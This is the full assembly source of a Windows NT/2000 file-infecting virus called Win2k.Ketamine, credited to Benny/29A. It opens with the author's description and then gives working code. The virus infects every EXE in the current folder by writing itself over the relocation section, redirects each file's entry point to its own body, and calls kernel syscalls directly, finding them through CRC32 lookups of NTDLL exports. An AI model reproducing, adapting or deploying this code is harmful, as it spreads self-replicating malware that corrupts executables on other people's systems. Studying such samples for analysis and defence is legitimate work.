
COMMENT#

                           ⁄¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬ø
                           √≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈¥ 
                           √≈≈≈≈¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡≈≈≈≈¥ 
                           √≈≈≈¥  Win2k.Ketamine  √≈≈≈¥ 
                           √≈≈≈¥   by Benny/29A   √≈≈≈¥
                           √≈≈≈≈¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬≈≈≈≈¥
                           √≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈¥
                           ¿¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡Ÿ



This is my next (very small) virus, specialised on Win2k machinez. It should be also
able to run under WinNT machinez, but I'm not sure, becoz I didn't test it. The virus
does not use any APIz, instead of that, its uses NT syscallz. The virus does not do
anything special apart of that, it can only infect all EXE filez in current folder
and does not manifest itself in any way. Infected filez have the same size, becoz
virus overwritez the relocation section. The virus should be compatible with newer
versionz of Windows OS'ez based on NT system. The only point of incompatibility is,
becoz I decided to not use ANY API, the code where the virus expect the fixed address
of NTDLL.dll modul loaded in process virtual memory. Virus searchez inside the NTDLL.dll
for syscall numberz and so it SHOULD be forward compatible. At least a bit...;-)

Here I have to thank Ratter, he inspired me a lot with his Win2k.Joss. The functionality
of Win2k.Ketamine and Win2k.Joss is almost the same, I only recoded some of his code on my
own and added a few new ideaz, which should make Ketamine more compatible with Windows,
rather than Joss. I have to say, that he inspired me a lot, but the code is not ripped. I
also disassembled NTDLL.dll and NTOSKRNL.EXE and found the same resultz as him, surprisely ;-D
But ofcoz, I decided to not discover the America again and so I used some of his code in
my virus.

The virus was coded only to show that something is possible, not to make high-spreading virus.

Enjoy it!



(c)oded in August, 2001
Czech Republic.
#





.386p
.model	flat,stdcall
locals

include	win32api.inc
include	useful.inc
include	mz.inc
include	pe.inc


invoke	macro	api				;macro for API callz
	extrn	api:PROC
	call	api
endm


unicode_string	struc
	us_length	dd	?		;length of the string
	us_pstring	dd	?		;ptr to string
unicode_string	ends


path	struc
	p_path	dw	MAX_PATH dup (?)	;maximal length of path in unicode
path	ends


object_attributes	struc
	oa_length	dd	?		;length of structure
	oa_rootdir	dd	?
	oa_objectname	dd	?		;name of object
	oa_attribz	dd	?		;attributez of the object
	oa_secdesc	dd	?
	oa_secqos	dd	?
object_attributes	ends


pio_status	struc				;status structure
	ps_ntstatus	dd	?
	ps_info		dd	?
pio_status	ends


.data
	db	?				;some data


.code
_Start:	pushad
gdelta = $+5					;delta offset
	@SEH_SetupFrame	<jmp	end_seh>

	mov	edx,cs
	xor	dl,dl
	jne	end_seh				;must be under winNT/2k!

	mov	ebp,[esp+4]
	call	get_syscalls			;get numberz of all needed syscallz

Start	Proc
	local	uni_string:unicode_string
	local	u_string:path
	local	object_attr:object_attributes
	local	io_status:pio_status
	local	dHandle:DWORD
	local	WFD:WIN32_FIND_DATA

	mov	[uni_string.us_length],80008h	;length of the string
	lea	edi,[u_string]
	mov	[uni_string.us_pstring],edi	;set the pointer
	call	@qm
	dw	'\','?','?','\'			;initial string of the object
@qm:	pop	esi
	movsd
	movsd					;save it
	mov     esi,fs:[18h]
	mov     esi,[esi+30h]
	mov     esi,[esi+10h]
	add     esi,24h
	mov     esi,[esi+4]			;ESI = current folder
	xor	ecx,ecx
l_copy:	lodsw
	inc	ecx
	stosw					;append it
	test	eax,eax
	jne	l_copy
	dec	ecx

	lea	edi,[uni_string]
	shl	ecx,1
	add	cx,[edi]
	mov	ax,cx
	shl	ecx,16
	mov	cx,ax
	mov	[edi],ecx			;save the new length

	xor	ecx,ecx				;initialize the structure ...
	lea	eax,[uni_string]
	lea	edi,[object_attr]
	mov	[edi.oa_length],24
	and	[edi.oa_rootdir],ecx
	mov	[edi.oa_objectname],eax
	mov	[edi.oa_attribz],40h
	and	[edi.oa_secdesc],ecx
	and	[edi.oa_secqos],ecx

	push	4021h
	push	3h
	lea	eax,[io_status]
	push	eax
	push	edi
	push	100001h
	lea	ebx,[dHandle]
	push	ebx
	call	NtOpenFile			;open the current folder
	mov	ebx,[ebx]

	xor	ecx,ecx
f_loop:	push	ecx

	xor	eax,eax
	push	eax
	call	@p1
	dd	0A000Ah				;length of the string
	dd	?				;ptr to string
@p1:	pop	esi
	call	@exe
	dw	'<','.','E','X','E'		;string
@exe:	pop	dword ptr [esi+4]		;save the ptr
	jecxz	@1st
	xor	esi,esi
@1st:	push	esi
	push	1
	push	3
	push	MAX_PATH*2
	lea	edx,[WFD]
	push	edx
	lea	edx,[io_status]
	push	edx
	push	eax
	push	eax
	push	eax
	push	ebx
	mov	eax,12345678h
NtQDF = dword ptr $-4
	lea	edx,[esp]
	int	2Eh				;NtQueryDirectoryFile
	add	esp,4*11			;correct the stack

	pop	ecx
	test	eax,eax
	jne	e_loop				;quit if no more file

	push	dword ptr [uni_string]		;save the length

	lea	esi,[WFD]			;WIN32_FIND_DATA structure
	lea	edi,[uni_string]		;the filename
	call	infect_file			;infect the file

	pop	dword ptr [uni_string]		;restore the length
	inc	ecx
	jmp	f_loop				;find next file

e_loop:	push	ebx
	call	NtClose				;close the directory

	leave
end_seh:@SEH_RemoveFrame
	popad

	extrn	ExitProcess:PROC
	push	cs
	push	offset ExitProcess
original_ep = dword ptr $-4
	retf					;jump to host!
Start	EndP



NtClose:mov	eax,12345678h
NtC = dword ptr $-4
	lea	edx,[esp+4]
	int	2Eh				;close the handle
	ret	4

NtOpenFile:
	mov	eax,12345678h
NtOF = dword ptr $-4
	lea	edx,[esp+4]
	int	2Eh				;open the object
	ret	4*6



infect_file	Proc
	local	object_attr:object_attributes
	local	io_status:pio_status
	local	fHandle:DWORD
	local	sHandle:DWORD
	local	sOffset:DWORD
	local	bytez:DWORD
	local	sOffset2:QWORD

	pushad
	@SEH_SetupFrame	<jmp	if_end>

	movzx	edx,word ptr [edi]
	add	edx,[edi+4]
	push	edi
	mov	edi,edx				;EDI - end of string

	mov	ecx,[esi+3Ch]			;size of filename
	push	ecx
	lea	esi,[esi+5Eh]			;filename
	rep	movsb				;copy the string
	pop	ecx
	pop	edi

	add	cx,[edi]
	mov	ax,cx
	shl	ecx,16
	mov	cx,ax
	mov	[edi],ecx			;size of path+filename
	xchg	eax,edi

	xor	ecx,ecx				;initialize the structure...
	lea	edi,[object_attr]
	mov	[edi.oa_length],24
	and	[edi.oa_rootdir],ecx
	mov	[edi.oa_objectname],eax
	mov	[edi.oa_attribz],40h
	and	[edi.oa_secdesc],ecx
	and	[edi.oa_secqos],ecx

	push	4060h
	push	3h
	lea	ecx,[io_status]
	push	ecx
	push	edi
	push	100007h
	lea	ebx,[fHandle]
	push	ebx
	call	NtOpenFile			;open the file
	test	eax,eax
	jne	if_end
	mov	ebx,[ebx]

	xor	eax,eax
	push	ebx
	push	8000000h
	push	PAGE_READWRITE
	push	eax
	push	eax
	push	0F0007h
	lea	ebx,[sHandle]
	push	ebx
	mov	eax,12345678h
NtCS = dword ptr $-4
	mov	edx,esp
	int	2Eh				;NtCreateSection
	add	esp,4*7				;correct stack
	test	eax,eax
	jne	if_end2
	mov	ebx,[ebx]

	lea	edx,[bytez]			;initialize some variablez
	xor	eax,eax
	and	[sOffset],eax
	and	[edx],eax
	and	dword ptr [sOffset2],eax
	and	dword ptr [sOffset2+4],eax

	push	4
	push	eax
	push	1
	push	edx
	lea	edx,[sOffset2]
	push	edx
	push	eax
	push	eax
	lea	esi,[sOffset]
	push	esi
	push	-1
	push	ebx
	mov	eax,12345678h
NtMVOS = dword ptr $-4
	mov	edx,esp
	int	2Eh				;NtMapViewOfSection
	add	esp,4*10
	test	eax,eax
	jne	if_end3
	mov	ebx,[esi]			;EBX = start of memory-mapped file

	mov	esi,[ebx.MZ_lfanew]
	add	esi,ebx
	mov	eax,[esi]
	add	eax,-IMAGE_NT_SIGNATURE
	jne	if_end4				;must be PE file

	;discard not_executable and system filez
	cmp	word ptr [esi.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
	jne	if_end4
	mov	ax,[esi.NT_FileHeader.FH_Characteristics]
	test	ax,IMAGE_FILE_EXECUTABLE_IMAGE
	je	if_end4
	test	ax,IMAGE_FILE_DLL
	jne	if_end4
	test	ax,IMAGE_FILE_SYSTEM
	jne	if_end4
	mov	al,byte ptr [esi.NT_FileHeader.OH_Subsystem]
	test	al,IMAGE_SUBSYSTEM_NATIVE
	jne	if_end4

	movzx	eax,word ptr [esi.NT_FileHeader.FH_NumberOfSections]
	dec	eax
	test	eax,eax
	je	if_end4
	imul	eax,eax,IMAGE_SIZEOF_SECTION_HEADER
	movzx	edx,word ptr [esi.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	edi,[eax+edx+IMAGE_SIZEOF_FILE_HEADER+4]
	add	edi,esi
	lea	edx,[esi.NT_OptionalHeader.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress]
	mov	eax,[edx]
	test	eax,eax
	je	if_end4
	cmp	eax,[edi.SH_VirtualAddress]
	jne	if_end4
	cmp	[edi.SH_SizeOfRawData],virus_end-_Start
	jb	if_end4				;is it large enough?

	pushad
	xor	eax,eax
	mov	edi,edx
	stosd
	stosd
	popad					;erase relocs record

	;align the section size
	mov	eax,virus_end-_Start
	cmp	eax,[edi.SH_VirtualSize]
	jb	o_vs
	mov	ecx,[esi.NT_OptionalHeader.OH_SectionAlignment]
	cdq
	div	ecx
	test	edx,edx
	je	o_al
	inc	eax
o_al:	mul	ecx
	mov	[edi.SH_VirtualSize],eax

o_vs:	push	ebp				;save EBP
	call	idelta				;get delta offset
idelta:	pop	ebp
	push	dword ptr [ebp + original_ep - idelta]

	mov	eax,[esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
	push	dword ptr [edi.SH_VirtualAddress]
	pop	dword ptr [esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
	mov	[ebp + original_ep - idelta],eax
	mov	eax,[esi.NT_OptionalHeader.OH_ImageBase]
	add	[ebp + original_ep - idelta],eax
						;set saved_entrypoint variable
	pushad
	mov	edi,[edi.SH_PointerToRawData]
	add	edi,ebx
	lea	esi,[ebp + _Start - idelta]
	mov	ecx,(virus_end-_Start+3)/4
	rep	movsd				;overwrite relocs by virus body
	popad
	pop	dword ptr [ebp + original_ep - idelta]
						;restore used variablez
	or	dword ptr [edi.SH_Characteristics],IMAGE_SCN_MEM_WRITE
	pop	ebp				;restore EBP

if_end4:push	ebx
	push	-1
	mov	eax,12345678h
NtUVOS = dword ptr $-4
	mov	edx,esp
	int	2Eh				;NtUnmapViewOfSection
	add	esp,4*2
if_end3:push	[sHandle]
	call	NtClose				;close the section
if_end2:push	[fHandle]
	call	NtClose				;close the file
if_end:	@SEH_RemoveFrame
	popad
	ret
infect_file	EndP



get_syscalls	Proc
	mov	esi,77F80000h			;base of NTDLL.dll
	mov	edx,[esi.MZ_lfanew]
	add	edx,esi
	mov	ebx,[edx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	add	ebx,esi
	mov	ecx,[ebx.ED_NumberOfNames]
	mov	edx,[ebx.ED_AddressOfNames]
	add	edx,esi

	xor	eax,eax
c_find:	pushad
	add	esi,[edx+eax*4]
	push	esi
	@endsz
	mov	edi,esi
	pop	esi
	sub	edi,esi
	call	CRC32			;calculate CRC32 of the API

	push	6			;number of syscallz
	pop	ecx

	call	@callz
	dd	09ECA4E0Fh		;NtOpenFile
	dd	0D5494178h		;NtQueryDirectoryFile
	dd	0B964B7BEh		;NtClose
	dd	03F2482E6h		;NtCreateSection
	dd	010710614h		;NtMapViewOfSection
	dd	0864CF09Bh		;NtUnmapViewOfSection
@callz:	pop	edx

c_look:	cmp	[edx-4+(ecx*4)],eax
	je	got_call
	loop	c_look
c_out:	popad
	inc	eax
	loop	c_find
	ret

got_call:
	mov	edx,[ebx.ED_AddressOfOrdinals]
	mov	esi,[esp.Pushad_esi]
	add	edx,esi
	mov	eax,[esp.Pushad_eax]
	movzx	eax,word ptr [edx+eax*2]
	mov	edx,esi
	add	edx,[ebx.ED_AddressOfFunctions]
	mov	eax,[edx+eax*4]
	add	eax,esi

	mov	eax,[eax+1]		;get number of the syscall
	lea	edx,[ebp + _Start - gdelta]
	add	edx,[ebp + sys_addr-4+ecx*4 - gdelta]
	mov	[edx],eax		;save it
	jmp	c_out
get_syscalls	EndP


sys_addr:				;where to save syscall numberz...
	dd	offset NtOF-_Start
	dd	offset NtQDF-_Start
	dd	offset NtC-_Start
	dd	offset NtCS-_Start
	dd	offset NtMVOS-_Start
	dd	offset NtUVOS-_Start

CRC32:	push	ecx			;procedure for calculating CRC32s
	push	edx			;at run-time
	push	ebx       
        xor	ecx,ecx   
        dec	ecx        
        mov	edx,ecx   
NextByteCRC:           
        xor	eax,eax   
        xor	ebx,ebx   
        lodsb          
        xor	al,cl     
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0EDB8h
NoCRC:  dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
        dec	edi
	jne	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx
	pop	ecx
	ret

signature	db	0,'WinNT.Ketamine by Benny/29A',0

virus_end:
End	_Start
